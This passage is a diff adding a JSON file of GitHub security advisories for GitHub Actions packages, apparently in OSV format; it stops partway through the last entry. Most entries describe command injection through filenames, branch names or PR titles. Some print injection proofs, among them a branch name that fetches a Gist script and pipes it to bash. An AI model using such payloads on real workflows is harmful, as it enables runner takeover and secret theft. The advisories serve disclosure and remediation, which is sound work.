@@ -1,0 +1,1229 @@
+[
+    {
+        "id": "GHSA-7f32-hm4h-w77q",
+        "summary": "github-slug-action use of `set-env` Runner commands which are processed via stdout",
+        "details": "### Impact\nThis GitHub Action use `set-env` runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w\n\n### Patches\nThe following versions use the recommended [Environment File Syntax](https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files).\n\n- 2.1.1\n- 1.1.1\n\n### Workarounds\nNone, it is strongly suggested that you upgrade as soon as possible.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [rlespinasse/github-slug-action](https://github.com/rlespinasse/github-slug-action)\n",
+        "modified": "2024-04-22T18:47:56Z",
+        "published": "2024-02-03T00:22:22Z",
+        "database_specific": {
+            "github_reviewed_at": "2024-02-03T00:22:22Z",
+            "github_reviewed": true,
+            "severity": "MODERATE",
+            "cwe_ids": [],
+            "nvd_published_at": null
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/rlespinasse/github-slug-action"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "rlespinasse/github-slug-action",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "1.1.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-7f32-hm4h-w77q/GHSA-7f32-hm4h-w77q.json",
+                    "last_known_affected_version_range": "<= 1.1.0"
+                }
+            },
+            {
+                "package": {
+                    "name": "rlespinasse/github-slug-action",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "2.0.0"
+                            },
+                            {
+                                "fixed": "2.1.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-7f32-hm4h-w77q/GHSA-7f32-hm4h-w77q.json",
+                    "last_known_affected_version_range": "<= 2.1.0"
+                }
+            }
+        ],
+        "schema_version": "1.6.0"
+    },
+    {
+        "id": "GHSA-ghm2-rq8q-wrhc",
+        "summary": "Potential Actions command injection in output filenames (GHSL-2023-275)",
+        "details": "### Summary\nThe [`tj-actions/verify-changed-files`](https://github.com/tj-actions/verify-changed-files) action allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.\n\n### Details\nThe [`verify-changed-files`](https://github.com/tj-actions/verify-changed-files) workflow returns the list of files changed within a workflow execution.\n\nThis could potentially allow filenames that contain special characters such as `;` and \\` (backtick) which can be used by an attacker to take over the [GitHub Runner](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) if the output value is used in a raw fashion (thus being directly replaced before execution) inside a `run` block. By running custom commands an attacker may be able to steal **secrets** such as `GITHUB_TOKEN` if triggered on other events than `pull_request`. For example on `push`.\n\n#### Proof of Concept\n\n1. Submit a pull request to the repository with a new file injecting a command. For example `$(whoami).txt` would be a valid filename.\n2. Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the `List all changed files tracked and untracked files` step.\n\n```yaml\n- name: List all changed files tracked and untracked files\n  run: |\n    echo \"Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}\"\n```\n\nExample output:\n\n```yaml\n##[group]Run echo \"Changed files: $(whoami).txt\"\n  echo \"Changed files: $(whoami).txt\"\u001b[0m\nshell: /usr/bin/bash -e {0}\n##[endgroup]\nChanged files: runner.txt\n```\n\n### Impact\nThis issue may lead to arbitrary command execution in the GitHub Runner.\n\n### Resolution\n- A new `safe_output` input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.\n\n- A safe recommendation of using environment variables to store unsafe outputs.\n\n```yaml\n- name: List all changed files tracked and untracked files\n  env:\n     CHANGED_FILES: ${{ steps.verify-changed-files.outputs.changed_files }}\n  run: |\n    echo \"Changed files: $CHANGED_FILES\"\n```\n\n\n### Resources\n\n* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\n* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)\n",
+        "aliases": [
+            "CVE-2023-52137"
+        ],
+        "modified": "2024-01-02T16:42:27Z",
+        "published": "2024-01-02T16:42:27Z",
+        "database_specific": {
+            "github_reviewed_at": "2024-01-02T16:42:27Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-20",
+                "CWE-77"
+            ],
+            "nvd_published_at": "2023-12-29T17:16:07Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-52137"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/tj-actions/verify-changed-files"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "tj-actions/verify-changed-files",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "17"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-ghm2-rq8q-wrhc/GHSA-ghm2-rq8q-wrhc.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-mcph-m25j-8j63",
+        "summary": "tj-actions/changed-files has Potential Actions command injection in output filenames (GHSL-2023-271)",
+        "details": "### Summary\nThe `tj-actions/changed-files` workflow allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.\n\n### Details\nThe [`changed-files`](https://github.com/tj-actions/changed-files) action returns a list of files changed in a commit or pull request which provides an `escape_json` input [enabled by default](https://github.com/tj-actions/changed-files/blob/94549999469dbfa032becf298d95c87a14c34394/action.yml#L136), only escapes `\"` for JSON values. \n\nThis could potentially allow filenames that contain special characters such as `;` and \\` (backtick) which can be used by an attacker to take over the [GitHub Runner](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) if the output value is used in a raw fashion (thus being directly replaced before execution) inside a `run` block. By running custom commands an attacker may be able to steal **secrets** such as `GITHUB_TOKEN` if triggered on other events than `pull_request`. For example on `push`.\n\n#### Proof of Concept\n\n1. Submit a pull request to a repository with a new file injecting a command. For example `$(whoami).txt` which is a valid filename.\n2. Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the `List all changed files` step below.\n\n```yaml\n      - name: List all changed files\n        run: |\n          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do\n            echo \"$file was changed\"\n          done\n```\n\nExample output:\n\n```yaml\n##[group]Run for file in $(whoami).txt; do\n    for file in $(whoami).txt; do\n        echo \"$file was changed\"\n    done\nshell: /usr/bin/bash -e {0}\n##[endgroup]\nrunner.txt was changed\n```\n\n### Impact\n\nThis issue may lead to arbitrary command execution in the GitHub Runner.\n\n### Resolution\n- A new `safe_output` input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.\n\n- A safe recommendation of using environment variables to store unsafe outputs.\n\n```yaml\n- name: List all changed files\n  env:\n    ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}\n  run: |\n    for file in \"$ALL_CHANGED_FILES\"; do\n      echo \"$file was changed\"\n    done\n```\n\n### Resources\n\n* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\n* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)",
+        "aliases": [
+            "CVE-2023-51664"
+        ],
+        "modified": "2024-01-02T16:41:27Z",
+        "published": "2024-01-02T16:41:27Z",
+        "database_specific": {
+            "github_reviewed_at": "2024-01-02T16:41:27Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-74",
+                "CWE-77"
+            ],
+            "nvd_published_at": "2023-12-27T17:15:08Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-51664"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/tj-actions/changed-files"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "tj-actions/changed-files",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "41"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/01/GHSA-mcph-m25j-8j63/GHSA-mcph-m25j-8j63.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-99jg-r3f4-rpxj",
+        "summary": "memory overflow vulnerability in OpenEXR-viewer",
+        "details": "Just open this exr file through openexr-viewer.\n\n( poc send by email )\n\nThis is windbg log file.\n\n[ POC 2 ]\n(8660.7e44): Access violation - code c0000005 (!!! second chance !!!)\nopenexr_viewer+0x27be4:\n00007ff7`13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000020a`3ac8000c=????????\n\nAttempt to write the value 1.0 to the memory address 0x20A3AC8000C\n\n[ POC 1 ]\n(1404.9264): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nopenexr_viewer+0x27be4:\n00007ff7`13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000029c`b371600c=????????\n\nAttempt to write the value 1.0 to the memory address 0x29CB371600C\n\n\nCredits\nTeam : ZeroPointer\n\uc774\ub3d9\ud558\u2003( Lee Dong Ha of ZeroPointer Lab )\n\uc815\uc9c0\ubbfc \u00a0\u00a0\u00a0( Jeong Jimin of ZeroPointer Lab )\n\ubc15\uc6b0\uc9c4\u00a0\u00a0\u00a0 ( Park Woojin of ZeroPointer Lab )\n\uc804\uc6b0\uc9c4\u00a0\u00a0\u00a0 ( Jeon Woojin of ZeroPointer Lab )\n",
+        "aliases": [
+            "CVE-2023-50245"
+        ],
+        "modified": "2023-12-12T13:41:33.264924Z",
+        "published": "2023-12-12T13:20:29Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-12-12T13:20:29Z",
+            "github_reviewed": true,
+            "severity": "CRITICAL",
+            "cwe_ids": [
+                "CWE-120"
+            ],
+            "nvd_published_at": "2023-12-11T23:15:08Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50245"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/afichet/openexr-viewer"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "afichet/openexr-viewer",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "0.6.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-99jg-r3f4-rpxj/GHSA-99jg-r3f4-rpxj.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-8v8w-v8xg-79rf",
+        "summary": "tj-actions/branch-names's Improper Sanitization of Branch Name Leads to Arbitrary Code Injection",
+        "details": "### Summary\n\nThe `tj-actions/branch-names` GitHub Actions references the `github.event.pull_request.head.ref` and `github.head_ref` context variables within a GitHub Actions `run` step. The head ref variable is the branch name and can be used to execute arbitrary code using a specially crafted branch name.\n\n### Details \n\nThe vulnerable code is within the `action.yml` file the `run` step references the value directly, instead of a sanitized variable.\n\n```yml\nruns:\n  using: \"composite\"\n  steps:\n    - id: branch\n      run: |\n        # \"Set branch names...\"\n        if [[ \"${{ github.ref }}\" != \"refs/tags/\"* ]]; then\n          BASE_REF=$(printf \"%q\" \"${{ github.event.pull_request.base.ref || github.base_ref }}\")\n          HEAD_REF=$(printf \"%q\" \"${{ github.event.pull_request.head.ref || github.head_ref }}\")\n          REF=$(printf \"%q\" \"${{ github.ref }}\")\n```\n\nAn attacker can use a branch name to inject arbitrary code, for example: `Test\")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$(\"foo` will download and run a script from a Gist. This allows an attacker to inject a payload of arbitrary complexity.\n\n### Impact\nAn attacker can use this vulnerability to steal secrets from or abuse `GITHUB_TOKEN` permissions.\n\n### Reference\n- https://securitylab.github.com/research/github-actions-untrusted-input",
+        "aliases": [
+            "CVE-2023-49291"
+        ],
+        "modified": "2023-12-06T20:48:41Z",
+        "published": "2023-12-05T23:30:10Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-12-05T23:30:10Z",
+            "github_reviewed": true,
+            "severity": "CRITICAL",
+            "cwe_ids": [
+                "CWE-20"
+            ],
+            "nvd_published_at": "2023-12-05T00:15:09Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49291"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/tj-actions/branch-names"
+            },
+            {
+                "type": "WEB",
+                "url": "https://securitylab.github.com/research/github-actions-untrusted-input"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "tj-actions/branch-names",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "7.0.7"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-8v8w-v8xg-79rf/GHSA-8v8w-v8xg-79rf.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-hw6r-g8gj-2987",
+        "summary": "Actions expression injection in `filter-test-configs` (`GHSL-2023-181`)",
+        "details": "The `pytorch/pytorch` `filter-test-configs` workflow is vulnerable to an expression injection in Actions, allowing an attacker to potentially leak secrets and alter the repository using the workflow.\n\n### Details\n\nThe [`filter-test-configs`](https://github.com/pytorch/pytorch/blob/ec26947c586dd323d741da80008403664c533f65/.github/actions/filter-test-configs/action.yml) workflow is using the raw `github.event.workflow_run.head_branch` value inside the `filter` step:\n\n```yaml\n- name: Select all requested test configurations\n  shell: bash\n  env:\n    GITHUB_TOKEN: ${{ inputs.github-token }}\n    JOB_NAME: ${{ steps.get-job-name.outputs.job-name }}\n  id: filter\n  run: |\n    ...\n    python3 \"${GITHUB_ACTION_PATH}/../../scripts/filter_test_configs.py\" \\\n      ...\n      --branch \"${{ github.event.workflow_run.head_branch }}\"\n```\n\nIn the event of a repository using `filter-test-configs` in a `pull_request_target`-triggered workflow, an attacker could use a malicious branch name to gain command execution in the step and potentially leak secrets.\n\n```yml\nname: Example\n\non: pull_request_target\n\njobs:\n  example:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Filter\n        uses: pytorch/pytorch/.github/actions/filter-test-configs@v2\n```\n\n#### Impact\n\nThis issue may lead to stealing workflow secrets.\n\n#### Remediation\n\n1. Use an intermediate environment variable for potentially attacker-controlled values such as `github.event.workflow_run.head_branch`:\n```yaml\n- name: Select all requested test configurations\n  shell: bash\n  env:\n    GITHUB_TOKEN: ${{ inputs.github-token }}\n    JOB_NAME: ${{ steps.get-job-name.outputs.job-name }}\n    HEAD_BRANCH: ${{ github.event.workflow_run.head_branch }}\n  id: filter\n  run: |\n    ...\n    python3 \"${GITHUB_ACTION_PATH}/../../scripts/filter_test_configs.py\" \\\n      ...\n      --branch \"$HEAD_BRANCH\"\n```\n\n#### Resources\n\n* [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)\n* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)\n* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)\n",
+        "modified": "2023-08-30T20:47:13Z",
+        "published": "2023-08-30T20:47:13Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-08-30T20:47:13Z",
+            "github_reviewed": true,
+            "severity": "MODERATE",
+            "cwe_ids": [],
+            "nvd_published_at": null
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/pytorch/pytorch/security/advisories/GHSA-hw6r-g8gj-2987"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/pytorch/pytorch"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "https://github.com/pytorch/pytorch/.github/actions/filter-test-configs",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/08/GHSA-hw6r-g8gj-2987/GHSA-hw6r-g8gj-2987.json",
+                    "last_known_affected_version_range": "< 2.0.1"
+                }
+            }
+        ],
+        "schema_version": "1.6.0"
+    },
+    {
+        "id": "GHSA-h3qr-39j9-4r5v",
+        "summary": "Data written to GitHub Actions Cache may expose secrets",
+        "details": "### Impact\n\nThis vulnerability impacts GitHub workflows using the [Gradle Build Action](https://github.com/marketplace/actions/gradle-build-action) that have executed the Gradle Build Tool with the [configuration cache](https://docs.gradle.org/current/userguide/configuration_cache.html) enabled, potentially exposing secrets configured for the repository.\n\nSecrets configured for GitHub Actions are normally passed to the Gradle Build Tool via environment variables. Due to the way that the Gradle Build Tool records these environment variables, they may be persisted into an entry in the GitHub Actions cache. This data stored in the GitHub Actions cache can be read by a GitHub Actions workflow running in an untrusted context, such as that running for a Pull Request submitted by a developer via a repository fork.\n\nThis vulnerability was discovered internally through code review, and we have not seen any evidence of it being exploited in the wild. However, in addition to upgrading the Gradle Build Action, you should delete any potentially vulnerable cache entries and may choose to rotate any potentially affected secrets ([see Remediation](#Remediation)).\n\n### Patches\n\n[Gradle Build Action v2.4.2](https://github.com/gradle/gradle-build-action/releases/tag/v2.4.2) (and newer) no longer save this sensitive data for later use, preventing ongoing leakage of secrets via the GitHub Actions Cache. We strongly recommend that all users of the Gradle Build Action upgrade to `v2.4.2` (or simply `v2`) immediately.\n\n### Remediation\n\nWhile upgrading to the latest version of the Gradle Build Action will prevent leakage of secrets going forward, additional actions may be required due to current or previous GitHub Actions Cache entries containing this information.\n\nCurrent cache entries will remain vulnerable until they are forcibly deleted or they expire naturally after 7 days of not being used. Potentially vulnerable entries can be easily identified in the GitHub UI by searching for a cache entry with key matching `configuration-cache-*`. We recommend that users of the Gradle Build Action inspect their list of cache entries and [manually delete any that match this pattern](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#deleting-cache-entries).\n\nWhile we have not seen any evidence of this vulnerability being exploited, we recommend cycling any repository secrets if you cannot be certain that these have not been compromised. Compromise could occur if you run a GitHub Actions workflow for a pull request attempting to exploit this data. \nWarning signs to look for in a pull request include:\n- Making changes to GitHub Actions workflow files in a way that may attempt to read/extract data from the Gradle User Home or <project-root>/.gradle directories.\n- Making changes to Gradle build files or other executable files that may be invoked by a GitHub Actions workflow, in a way that may attempt to read/extract information from these locations.\n\n### Workarounds\n\nWe strongly recommend that all users upgrade to the latest version of the Gradle Build Action as soon as possible, and delete any potentially vulnerable cache entries from the GitHub Actions cache ([see Remediation](#Remediation)). \n\nIf for some reason this is not possible, users can limit the impact of this vulnerability:\n- If the Gradle project does not opt-in to using the configuration cache, then it is not vulnerable. \n- If the Gradle project does opt-in to using the configuration-cache by default, then the `--no-configuration-cache` command-line argument can be used to disable this feature in a GitHub Actions workflow.\n\nIn any case, we recommend that users carefully inspect any pull request before approving the execution of GitHub Actions workflows. It may be prudent to require approval for all PRs from external contributors, as described [here](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#controlling-changes-from-forks-to-workflows-in-public-repositories).",
+        "aliases": [
+            "CVE-2023-30853"
+        ],
+        "modified": "2023-11-08T04:12:27.816016Z",
+        "published": "2023-05-01T13:42:44Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-05-01T13:42:44Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-200",
+                "CWE-312"
+            ],
+            "nvd_published_at": "2023-04-28T16:15:10Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/gradle/gradle-build-action/security/advisories/GHSA-h3qr-39j9-4r5v"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30853"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/gradle/gradle-build-action"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/gradle/gradle-build-action/releases/tag/v2.4.2"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "gradle/gradle-build-action",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2.4.2"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/05/GHSA-h3qr-39j9-4r5v/GHSA-h3qr-39j9-4r5v.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-rg3q-prf8-qxmp",
+        "summary": "Arbitrary command injection in embano1/wip ",
+        "details": "## Summary\nThe  `embano1/wip` action uses the `github.event.pull_request.title` parameter in an insecure way. The title parameter is used in a run statement - resulting in a command injection vulnerability due to string interpolation.\n\n## Details and Impact\nThis vulnerability can be triggered by any user on GitHub. They just need to create a pull request with a commit message containing an exploit. (Note that first-time PR requests will not be run - but the attacker can submit a valid PR before submitting an invalid PR). The commit can be genuine, but the commit message can be malicious. \n\nThis can be used to execute code on the GitHub runners (potentially use it for crypto-mining, and waste your resources) and can be used to exfiltrate any secrets that you use in the CI pipeline (including repository tokens). [Here](https://securitylab.github.com/research/github-actions-untrusted-input/) is a set of blog posts by Github's security team explaining this issue.\n\n## How to update existing workflows\n\nReplace the following line in your workflow using this action with the `v2` branch name or commit pointing to this branch:\n\n```yaml\n    uses: embano1/wip@v2\n```\n\nOr using the exact commit:\n\n```yaml\n    uses: embano1/wip@c25450f77ed02c20d00b76ee3b33ff43838739a2 # v2\n```",
+        "aliases": [
+            "CVE-2023-30623"
+        ],
+        "modified": "2023-11-08T04:12:26.338450Z",
+        "published": "2023-04-24T22:32:32Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-04-24T22:32:32Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-77"
+            ],
+            "nvd_published_at": "2023-04-24T22:15:09Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/embano1/wip/security/advisories/GHSA-rg3q-prf8-qxmp"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30623"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/embano1/wip/commit/c25450f77ed02c20d00b76ee3b33ff43838739a2"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/embano1/wip"
+            },
+            {
+                "type": "WEB",
+                "url": "https://securitylab.github.com/research/github-actions-untrusted-input"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "embano1/wip",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-rg3q-prf8-qxmp/GHSA-rg3q-prf8-qxmp.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-6q4m-7476-932w",
+        "summary": "github-slug-action vulnerable to arbitrary code execution",
+        "details": "### Impact\n\nThis action uses the `github.head_ref` parameter in an insecure way. \n\nThis vulnerability can be triggered by any user on GitHub on any workflow using the action on pull requests. They just need to create a pull request with a branch name, which can contain the attack payload. (Note that first-time PR requests will not be run - but the attacker can submit a valid PR before submitting an invalid PR).  This can be used to execute code on the GitHub runners (potentially use it for crypto-mining, and waste your resources) and to exfiltrate any secrets you use in the CI pipeline.\n\n### Patches\n\n> Pass the variable as an environment variable and then use the environment variable instead of substituting it directly.\n\nPatched action is available on tag **v4**, tag **v4.4.1**, and any tag beyond.\n\n### Workarounds\n\nNo workaround is available if impacted, please upgrade the version\n\n> \u2139\ufe0f **v3** and **v4** are compatibles.\n\n### References\n\n[Here](https://securitylab.github.com/research/github-actions-untrusted-input/) is a set of blog posts by Github's security team explaining this issue.\n\n### Thanks\n\nThanks to the team of researchers from Purdue University, who are working on finding vulnerabilities in CI/CD configurations of open-source software. Their tool detected this security vulnerability.\n\n",
+        "aliases": [
+            "CVE-2023-27581"
+        ],
+        "modified": "2023-11-20T22:18:24Z",
+        "published": "2023-03-13T20:43:33Z",
+        "database_specific": {
+            "github_reviewed_at": "2023-03-13T20:43:33Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-77"
+            ],
+            "nvd_published_at": "2023-03-13T21:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-6q4m-7476-932w"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27581"
+            },
+            {
+                "type": "WEB",
